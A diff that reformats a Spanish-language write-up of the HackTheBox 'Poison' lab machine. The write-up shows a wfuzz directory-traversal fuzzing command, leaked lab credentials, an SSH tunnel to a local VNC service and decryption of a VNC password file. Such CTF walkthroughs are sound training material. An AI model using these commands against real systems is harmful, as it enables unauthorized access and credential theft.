@@ -39,7 +39,7 @@ En esta ocasión estaré resolviendo una máquina de nivel MEDIUM de HackTheBox 
 
 ## Reconocimiento de Puertos [📌](#recon-nmap) {#recon-nmap}
 
-```nmap
+```bash
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
@@ -49,7 +49,7 @@ Tenemos el puerto 22 (ssh) y el puertto 80 (http)
 
 Escaneo un poco más a fondo para encontrar más información al respecto.
 
-```nmap
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
 | ssh-hostkey: 
@@ -63,8 +63,6 @@ Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 ```
 
 # Enumeración [#](enumeración) {#enumeración}
-
-----
 
 ## Enumeración Web [📌](#enum-web) {#enum-web}
 
@@ -90,7 +88,9 @@ Tenemos una contraseña pero aún nos falta un usuario, asique al ver que en el 
 
 A través de un diccionario y la herramienta wfuzz compruebo si existe alguna de estas vulnerabilidades.
 
-> `wfuzz -c -w /usr/share/payloadsallthethings/"Directory Traversal"/Intruder/dotdotpwn.txt -u 'http://10.10.10.84/browse.php?file=FUZZ' --hl=4,2`
+```bash
+wfuzz -c -w /usr/share/payloadsallthethings/"Directory Traversal"/Intruder/dotdotpwn.txt -u 'http://10.10.10.84/browse.php?file=FUZZ' --hl=4,2
+```
 
 ![](/assets/images/HTB/Poison-HackTheBox/wfuzz.webp)
 
@@ -102,21 +102,17 @@ Tenemos el usuario Charix y su contraseña.
 
 > Charix:Charix!2#4%6&8(0
 
-Ahora intento loguearme con esas credenciales a través de ssh para obtener acceso al sistema.
+Ahora intento logarme con esas credenciales a través de ssh para obtener acceso al sistema.
 
 # Sesión SSH [#](sesion-ssh) {#sesion-ssh}
 
-----
-
 ## SSH [🔥](#ssh) {#ssh}
 
-Una vez nos logueamos podemos leer la flag user.txt 
+Una vez nos logamos podemos leer la flag user.txt 
 
 ![](/assets/images/HTB/Poison-HackTheBox/user.webp)
 
 # Escalada de Privilegios [#](privesc) {#privesc}
-
-----
 
 ## VNC [👽](vcn) {#vnc}
 
@@ -131,7 +127,7 @@ Nos lo descargamos a nuestra máquina atacante
 Password for charix@Poison:
 secret.zip
 ```
-Y lo descomprimimos usando la contraseña que usamos para conectarnos por ssh (Charix!2#4%6&8(0)
+Y lo descomprimimos usando la contraseña que usamos para conectarnos por ssh.
 
 ![](/assets/images/HTB/Poison-HackTheBox/secret.webp)
 
@@ -141,9 +137,11 @@ Dejo a un lado el archivo y enumero más vectores de escalada.
 
 Miro los procesos existentes en ejecución con el comando `ps aux`
 
-> `root   529   0.0  0.9  23620  8872 v0- I    22:34    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -d`
+```bash
+root   529   0.0  0.9  23620  8872 v0- I    22:34    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -d
+```
 
-```netstat
+```bash
 charix@Poison:~ % netstat -an
 Active Internet connections (including servers)
 Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
@@ -164,7 +162,9 @@ Tenemos el servicio VNC activo en el puerto 5901, asique para poder conectarme h
 
 Para crear el túnel:
 
-> `ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84`
+```bash
+ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+```
 
 Una vez creado ya puedo conectarme al servicio VNC a través de la herramienta vncviewer.
 
@@ -178,9 +178,9 @@ Pero tampoco hay suerte... asique intento decodificar el contenido del archivo s
 
 Encuentro esta herramienta [https://github.com/trinitronx/vncpasswd.py](https://github.com/trinitronx/vncpasswd.py) 
 
-La consigo decodificar
+La consigo decodificar...
 
-```vncpass
+```bash
 ❯ python2 vncpasswd.py -d -f /home/elc4br4/secret
 Decrypted Bin Pass= 'VNCP@$$!'
 Decrypted Hex Pass= '564e435040242421'
@@ -188,7 +188,9 @@ Decrypted Hex Pass= '564e435040242421'
 
 Y ya puedo conectarme.
 
-> `vncviewer 127.0.0.1:5901 -passwd VNCP@$$!`
+```bash
+vncviewer 127.0.0.1:5901 -passwd VNCP@$$!
+```
 
 ![](/assets/images/HTB/Poison-HackTheBox/vnc.webp)
 
